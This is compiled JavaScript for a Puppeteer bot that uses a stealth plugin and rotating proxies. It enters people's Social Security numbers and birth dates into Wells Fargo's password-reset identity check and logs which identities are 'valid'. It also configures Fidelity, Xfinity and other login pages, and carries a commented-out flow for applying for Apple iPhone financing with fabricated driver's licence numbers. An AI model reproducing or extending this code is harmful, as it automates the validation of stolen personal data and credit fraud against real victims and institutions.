"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.getCredentialInformationScrapper = exports.SCREENSHOT_DISABLED = exports.TIMEOUT_DEFAULT = exports.TIMEOUT_WAIT_FOR_RESPONSE_APPLE = exports.TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MILLISECONDS = exports.TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = void 0;
const axios_1 = __importDefault(require("axios"));
const puppeteer_extra_1 = __importDefault(require("puppeteer-extra"));
const puppeteer_extra_plugin_stealth_1 = __importDefault(require("puppeteer-extra-plugin-stealth"));
const constants_1 = require("./constants");
const utils_1 = require("./utils");
const path_1 = __importDefault(require("path"));
const fs_1 = __importDefault(require("fs"));
const logger_1 = __importDefault(require("./logger/logger"));
const generate_random_number_with_prefix_1 = require("./utils/generate-random-number-with-prefix");
const get_bot_config_1 = require("./utils/get-bot-config");
puppeteer_extra_1.default.use((0, puppeteer_extra_plugin_stealth_1.default)());
const isPkg = typeof process.pkg !== 'undefined';
console.log({ isPkg });
exports.TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS = (0, utils_1.minutesToMilliseconds)(constants_1.TIMEOUT_WAIT_FOR_NAVIGATION_MINUTES);
exports.TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MILLISECONDS = (0, utils_1.minutesToMilliseconds)(constants_1.TIMEOUT_WAIT_FOR_NAVIGATION_REFERRER_MINUTES);
exports.TIMEOUT_WAIT_FOR_RESPONSE_APPLE = (0, utils_1.minutesToMilliseconds)(constants_1.TIMEOUT_WAIT_FOR_RESPONSE_APPLE_MINUTES);
exports.TIMEOUT_DEFAULT = (0, utils_1.minutesToMilliseconds)(constants_1.TIMEOUT_WAIT_DEFAULT);
exports.SCREENSHOT_DISABLED = true;
const logTracking = (message, email) => {
    logger_1.default.warn(`${message} || ${email}`);
};
const getLoanAmountValue = () => constants_1.LOAN_AMOUNTS[(0, utils_1.getRamdomValue)(0, constants_1.LOAN_AMOUNTS.length - 1)];
var DriverLicenceState;
(function (DriverLicenceState) {
    DriverLicenceState["AZ"] = "AZ";
    DriverLicenceState["DE"] = "DE";
})(DriverLicenceState || (DriverLicenceState = {}));
const getDriverLicense = (state) => {
    switch (state) {
        case DriverLicenceState.DE:
            return (0, generate_random_number_with_prefix_1.generateRandomNumberWithPrefix)('0', 6);
        case DriverLicenceState.AZ:
            let prefixList = ['A', 'B', 'D', 'R'];
            let prefix = prefixList[(0, utils_1.getRamdomValue)(0, prefixList.length - 1)];
            return (0, generate_random_number_with_prefix_1.generateRandomNumberWithPrefix)(prefix, 8);
        default:
            return (0, generate_random_number_with_prefix_1.generateRandomNumberWithPrefix)('0', 6);
    }
};
const formatBid = (bid) => {
    const bidDate = new Date(bid);
    bidDate.setMinutes(bidDate.getMinutes() + bidDate.getTimezoneOffset());
    return new Intl.DateTimeFormat('en-US', {
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
    }).format(bidDate);
};
const CONFIGURATION_PER_PAGE = {
    xfinity: {
        pageUrl: 'https://login.xfinity.com/login',
        loanAmountSelector: '#amount',
        formSelector: '#homepage-form',
    },
    pilotflyingj: {
        pageUrl: 'https://loyaltyportal.pilotflyingj.com/myrewards/login',
        loanAmountSelector: '#amount',
        formSelector: '#homepage-form',
    },
    apple: {
        pageUrl: 'https://www.apple.com/shop/buy-iphone/iphone-15-pro/6.7-inch-display-256gb-blue-titanium-att',
        loanAmountSelector: '#amount',
        formSelector: '#homepage-form',
    },
    fidelity: {
        pageUrl: 'https://nb.fidelity.com/public/nbpreloginnav/app/forgotlogindomestic#/forgotLoginDomestic/verifyIdentity',
        loanAmountSelector: '#amount',
        formSelector: '#homepage-form',
    },
    wfVerify: {
        pageUrl: 'https://oam.wellsfargo.com/oamo/identity/help/passwordhelp#/',
        loanAmountSelector: '#amount',
        formSelector: '#homepage-form',
    },
};
const generateInputNameSelector = (name) => `[name=${name}]`;
const API_URLS = {
    apple: {
        validateAddress: '/preauth/api/validate-address',
        // validateAddress:
        //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/validate-address',
        // creditCheck:
        //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/credit-check',
        creditCheck: '/preauth/api/credit-check',
        downPayment: '/preauth/api/down_payment',
        // downPayment:
        //   '/WebObjects/IPACustomer.woa/wa/IPAPreAuthAction/api/down_payment',
    },
    fidelity: {
        search: 'https://ecaap.fidelity.com/user/identity/attributes/.search',
    },
};
const SELECTORS = {
    firstName: '#personFirstName',
    lastName: '#personLastName',
    month: '#dob-month-input',
    day: '#dob-day-input',
    year: '#dob-year-input',
    last4ssn: '#lastFourOfSSN',
    continue_button: 'button[type=submit]',
    ssn: '#ssn',
    dob: '#dob',
    phoneImageModal: 'div.ResponsiveModalListContent__normalInset____tNPh',
    // phoneImageModal:
    //   '#app-modal-root > div:nth-child(5) > div > div > div > div > div > div > div > div.Dimensions__dimensions___ev7C8.ResponsiveModalContent__dimensions___TGRVM > div > div:nth-child(2) > div.ResponsiveModalListContent__normalInset____tNPh',
    errorMessage: '#root > div > div > div:nth-child(2) > div > div > div > div:nth-child(1) > div > div > div > div.Identification__messageContainer___mTsX8 > div > div',
};
// [...document.querySelectorAll("input[name=planSelection]")][1].click()
const getIP = async () => {
    try {
        const botConfig = await (0, get_bot_config_1.getBotConfig)();
        const proxyConfig = {
            host: botConfig.proxy.split(':')[0],
            port: botConfig.proxy.split(':')[1],
        };
        const { data: ip } = await axios_1.default.get('http://api.ipify.org', {
            timeout: 5000,
            proxy: {
                protocol: 'http',
                host: proxyConfig.host,
                port: Number(proxyConfig.port),
            },
        });
        return ip;
    }
    catch (error) {
        logger_1.default.error(error);
        // defualt ip when request fails
        return '127.0.0.1';
    }
};
const validateIp = async (ip, pageConfigKey) => {
    const dirname = process.cwd();
    const IPs_Directory = path_1.default.join(`${dirname}/data/ips`);
    if (!fs_1.default.existsSync(IPs_Directory)) {
        fs_1.default.mkdirSync(IPs_Directory, { recursive: true });
    }
    const readFile = async () => {
        if (!fs_1.default.existsSync(`${IPs_Directory}/${pageConfigKey}.txt`)) {
            fs_1.default.writeFileSync(`${IPs_Directory}/${pageConfigKey}.txt`, '', 'utf8');
        }
        const fileContent = await fs_1.default.promises.readFile(`${IPs_Directory}/${pageConfigKey}.txt`, 'utf8');
        return fileContent;
    };
    const fileData = await readFile();
    const ipsData = fileData ? fileData.split(/\n/).filter(Boolean) : [];
    const isIPUsed = [...ipsData, '127.0.0.1'].includes(ip);
    if (!isIPUsed) {
        logger_1.default.warn(`New IP: ${ip}`);
        ipsData.push(ip);
        fs_1.default.writeFileSync(`${IPs_Directory}/${pageConfigKey}.txt`, ipsData.join('\n'), 'utf8');
    }
    return isIPUsed;
};
const getCredentialInformationScrapper = async (browser, credential, validWriteLineOnFile, invalidWriteLineOnFile, validFileName, pageConfigKey) => {
    const botConfig = await (0, get_bot_config_1.getBotConfig)();
    const HEADLESS = botConfig.openBrowser === 'yes' ? false : 'new';
    const proxyConfig = {
        host: botConfig.proxy.split(':')[0],
        port: botConfig.proxy.split(':')[1],
    };
    const { pageUrl } = CONFIGURATION_PER_PAGE[pageConfigKey];
    const chromiumExecutablePath = isPkg
        ? puppeteer_extra_1.default
            .executablePath()
            .replace(/^.*?\/node_modules\/puppeteer\/\.local-chromium/, path_1.default.join(path_1.default.dirname(process.execPath), '.local-chromium'))
        : puppeteer_extra_1.default.executablePath();
    let _browser = await puppeteer_extra_1.default.launch({
        headless: HEADLESS,
        executablePath: chromiumExecutablePath,
        // headless: false,
        // args: ['--proxy-server=162.244.132.210:6021'],
        args: [
            `--proxy-server=${proxyConfig.host}:${proxyConfig.port}`,
            '--no-sandbox',
        ],
    });
    // const page = await browser.newPage();
    let page = await _browser.newPage();
    page.setDefaultTimeout(exports.TIMEOUT_DEFAULT);
    await page.setViewport({
        width: 400,
        height: 634,
    });
    // await page.setRequestInterception(true);
    // page.on('request', (request) => {
    //   if (['image', 'font'].indexOf(request.resourceType()) !== -1) {
    //     // console.log('###Aborting non essential request to speed up site...');
    //     request.abort();
    //   } else {
    //     request.continue();
    //   }
    // });
    let ip = '';
    let isInvalidIp = false;
    try {
        await page.goto(pageUrl, {
            // waitUntil: 'domcontentloaded',
            waitUntil: 'networkidle2',
            timeout: exports.TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
        });
        while (isInvalidIp) {
            ip = await getIP();
            isInvalidIp = await validateIp(ip, pageConfigKey);
            if (isInvalidIp) {
                console.log(`CURRENT IP: ${ip}`);
            }
            await _browser.close();
            _browser = await puppeteer_extra_1.default.launch({
                headless: HEADLESS,
                // headless: false,
                args: [`--proxy-server=${proxyConfig.host}:${proxyConfig.port}`],
            });
            page = await _browser.newPage();
            page.setDefaultTimeout(exports.TIMEOUT_DEFAULT);
            await page.setViewport({
                width: 1920 / 1.5,
                height: 1080 / 1.5,
            });
            await page.goto(pageUrl, {
                waitUntil: 'networkidle2',
                timeout: exports.TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
            });
            await new Promise((r) => setTimeout(r, 3000));
        }
        // console.log('out of loop');
        const dirname = process.cwd();
        console.log({ dirname });
        const screenshotRedirectDirectory = path_1.default.join(`${dirname}/data/screenshots-redirect/${validFileName}`);
        if (!fs_1.default.existsSync(screenshotRedirectDirectory)) {
            fs_1.default.mkdirSync(screenshotRedirectDirectory, { recursive: true });
        }
        const screenshotRedirectPath = path_1.default.join(`${screenshotRedirectDirectory}/${credential.ssn}.png`);
        // await page.select(loanAmountSelector, loanAmountValue);
        // await page.waitForSelector(SELECTORS.paymentOptions.finance);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.paymentOptions.finance,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //   }
        // }, SELECTORS);
        // await page.waitForSelector(SELECTORS.paymentOptions.carrier);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.paymentOptions.carrier,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //   }
        // }, SELECTORS);
        // await page.waitForSelector(SELECTORS.paymentOptions.att);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.paymentOptions.att,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //   }
        // }, SELECTORS);
        // await new Promise((r) => setTimeout(r, 1500));
        // await page.waitForSelector(SELECTORS.paymentOptions.no_apple_care);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.paymentOptions.no_apple_care,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //     element.click();
        //   }
        // }, SELECTORS);
        // await new Promise((r) => setTimeout(r, 2000));
        // await page.waitForSelector(SELECTORS.paymentOptions.continue_button);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.paymentOptions.continue_button,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //   }
        // }, SELECTORS);
        // await Promise.all([
        //   // await page.click(SELECTORS.submitButton),
        //   await page.waitForNavigation({
        //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
        //     waitUntil: 'domcontentloaded',
        //   }),
        // ]);
        // await page.waitForSelector(SELECTORS.att_apply_page.newCustomer);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.att_apply_page.newCustomer,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //   }
        // }, SELECTORS);
        // await page.waitForSelector(SELECTORS.att_apply_page.continue_button);
        // await page.evaluate((SELECTORS) => {
        //   const element = document?.querySelector(
        //     SELECTORS.att_apply_page.continue_button,
        //   ) as HTMLInputElement | null;
        //   if (element) {
        //     element.click();
        //   }
        // }, SELECTORS);
        // // await page.waitForNetworkIdle();
        // // console.log('ready to set data on form!');
        // await page.waitForSelector(SELECTORS.apple_form.firstName);
        // const driverLicenceGenerated = getDriverLicense(
        //   credential.state as DriverLicenceState,
        // );
        const date = new Date(credential.bid);
        const month = String(date.getMonth()).length === 1
            ? '0' + String(date.getMonth())
            : String(date.getMonth());
        const day = String(date.getDay()).length === 1
            ? '0' + String(date.getDay())
            : String(date.getDay());
        console.log({
            getMonth: date.getMonth(),
            getDay: date.getDay(),
            getFullYear: date.getFullYear(),
            month,
            day,
        });
        let newBid = Intl.DateTimeFormat('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            timeZone: 'GMT',
        }).format(new Date(credential.bid));
        console.log({ newBid });
        console.log('ssn', credential.ssn);
        await page.waitForSelector(SELECTORS.ssn);
        await page.type(SELECTORS.ssn, credential.ssn);
        await new Promise((r) => setTimeout(r, 900));
        await page.click(SELECTORS.continue_button);
        await new Promise((r) => setTimeout(r, 1500));
        console.log('dob', newBid);
        await page.waitForSelector(SELECTORS.dob);
        await page.type(SELECTORS.dob, newBid);
        await Promise.all([await page.click(SELECTORS.continue_button)]);
        // const URLIdentityDob =
        //   'https://oam.wellsfargo.com/oamo/identity/help/passwordReset/identifyCustomerDob';
        // const finalResponse = await page.waitForResponse(
        //   (response) =>
        //     response.url().includes(URLIdentityDob) && response.status() === 200,
        // );
        // console.log({ finalResponse });
        // await new Promise((r) => setTimeout(r, 4000));
        await page.waitForSelector(SELECTORS.phoneImageModal, {
            timeout: 12000,
        });
        await new Promise((r) => setTimeout(r, 1000));
        const phoneImageModal = await page.$(SELECTORS.phoneImageModal);
        console.log({ phoneImageModal });
        if (phoneImageModal) {
            const outputMessage = (0, utils_1.generateOutputMessage)(credential);
            logger_1.default.info(outputMessage);
            validWriteLineOnFile(outputMessage);
        }
        else {
            const outputMessage = (0, utils_1.generateOutputMessage)(credential);
            logger_1.default.error(outputMessage);
            invalidWriteLineOnFile(outputMessage);
        }
        // await page.type(SELECTORS., String(date.getFullYear()));
        // await page.type(SELECTORS.apple_form.lastName, credential.lastname);
        // await page.type(SELECTORS.apple_form.email, credential.email);
        // await page.type(SELECTORS.apple_form.addressLine1, credential.address);
        // await page.type(SELECTORS.apple_form.addressState, credential.state);
        // await page.type(SELECTORS.apple_form.city, credential.city);
        // await page.type(SELECTORS.apple_form.idState, credential.state);
        // await page.type(SELECTORS.apple_form.zipcode, credential.zipCode);
        // await page.type(SELECTORS.apple_form.phonenumber, credential.phoneNumber);
        // await page.type(SELECTORS.apple_form.idnumber, driverLicenceGenerated);
        // await page.type(SELECTORS.apple_form.idState, credential.state);
        // console.log(formatBid(credential.bid));
        // await page.type(
        //   SELECTORS.apple_form.dateOfBirth,
        //   formatBid(credential.bid),
        // );
        // await page.type(SELECTORS.apple_form.socialSecurity, credential.ssn);
        // await page.waitForSelector(SELECTORS.apple_form.continue_button);
        // await page.click(SELECTORS.apple_form.continue_button);
        // const originURL = new URL(page.url()).origin;
        // const validateAddressResponse = (await (
        //   await page.waitForResponse(originURL + API_URLS.apple.validateAddress, {
        //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
        //   })
        // ).json()) as ValidateAddresResponse;
        // if (validateAddressResponse.data.globalAddress.matchStatus === 'EXACT') {
        //   //GOOOOOD
        //   console.log('GOOD Address');
        // } else {
        //   console.log('suggested Address');
        //   await page.waitForSelector(SELECTORS.apple_form.suggestedAddressButton);
        //   await new Promise((r) => setTimeout(r, 1500));
        //   await page.click(SELECTORS.apple_form.suggestedAddressButton);
        // }
        // const creditCheckResponse = (await (
        //   await page.waitForResponse(originURL + API_URLS.apple.creditCheck, {
        //     timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
        //   })
        // ).json()) as CreditCheckResponse;
        // if (creditCheckResponse.nextPage === 'getInstallmentPlans') {
        //   //GOOOOOD
        //   console.log('GOOD CREDIT');
        //   await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
        //   const installmentPlansElements = await page.$$(
        //     SELECTORS.apple_plan.installmentPlans,
        //   );
        //   await installmentPlansElements[1].click();
        //   await new Promise((r) => setTimeout(r, 1500));
        //   await page.waitForSelector(SELECTORS.apple_plan.continue_button);
        //   await page.click(SELECTORS.apple_plan.continue_button);
        //   await page.waitForSelector('[name=portin-type]');
        //   await page.evaluate(() => {
        //     (
        //       document.querySelectorAll('[name=portin-type]')[1] as HTMLInputElement
        //     )?.click();
        //   });
        //   await new Promise((r) => setTimeout(r, 1500));
        //   // button continue click after select number
        //   await page.waitForSelector(
        //     SELECTORS.apple_plan.continue_button_number_plan,
        //   );
        //   await page.click(SELECTORS.apple_plan.continue_button_number_plan);
        //   await page.waitForSelector(SELECTORS.apple_plan.installmentPlans);
        //   const installmentPlansWirelessElements = await page.$$(
        //     SELECTORS.apple_plan.installmentPlans,
        //   );
        //   await installmentPlansWirelessElements[2].click();
        //   await new Promise((r) => setTimeout(r, 1500));
        //   await page.waitForSelector(SELECTORS.apple_plan.continue_button_wireless);
        //   await page.click(SELECTORS.apple_plan.continue_button_wireless);
        //   const originDownPaymentURL = new URL(page.url()).origin;
        //   const downPaymentResponse = (await (
        //     await page.waitForResponse(
        //       originDownPaymentURL + API_URLS.apple.downPayment,
        //       {
        //         timeout: TIMEOUT_WAIT_FOR_RESPONSE_APPLE,
        //       },
        //     )
        //   ).json()) as DownPaymentResponse;
        //   ///               Down Payment validation block              ///
        //   if (downPaymentResponse.data.downPayment === '$0') {
        //     const outputMessage = generateOutputMessage(
        //       credential,
        //       page.url(),
        //       driverLicenceGenerated,
        //     );
        //     logger.info(outputMessage);
        //     validWriteLineOnFile(outputMessage);
        //   } else {
        //     const outputMessage = generateOutputMessage(
        //       credential,
        //       page.url(),
        //       driverLicenceGenerated,
        //       downPaymentResponse.data.downPayment,
        //     );
        //     logger.error(outputMessage);
        //     invalidWriteLineOnFile(outputMessage);
        //   }
        //   ///               Down Payment validation block              ///
        // } else {
        //   const outputMessage = generateOutputMessage(
        //     credential,
        //     page.url(),
        //     driverLicenceGenerated,
        //   );
        //   logger.error(outputMessage);
        //   invalidWriteLineOnFile(outputMessage);
        // }
        // // await Promise.all([
        // //   await page.click(SELECTORS.submitButton),
        // //   await page.waitForNavigation({
        // //     timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
        // //     waitUntil: 'domcontentloaded',
        // //   }),
        // // ]);
        // await new Promise((r) => setTimeout(r, 3000));
        // // if (page.url().includes('home')) {
        // //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
        // //   logger.info(outputMessage);
        // //   validWriteLineOnFile(outputMessage);
        // // } else {
        // //   const outputMessage = generateOutputMessage(credential, page.url(), ip);
        // //   logger.error(outputMessage);
        // //   invalidWriteLineOnFile(outputMessage);
        // // }
        // if (SCREENSHOT_DISABLED) {
        //   await page.screenshot({
        //     path: screenshotRedirectPath,
        //   });
        // }
    }
    catch (error) {
        console.error(error);
        logTracking(`ERROR WITH`, credential.ssn + ' !!');
        logger_1.default.error(`getCredentialInformationScrapper ERROR: ${error} || SSN:${credential.ssn} || URL: ${page.url()}`);
    }
    finally {
        await _browser.close();
    }
};
exports.getCredentialInformationScrapper = getCredentialInformationScrapper;
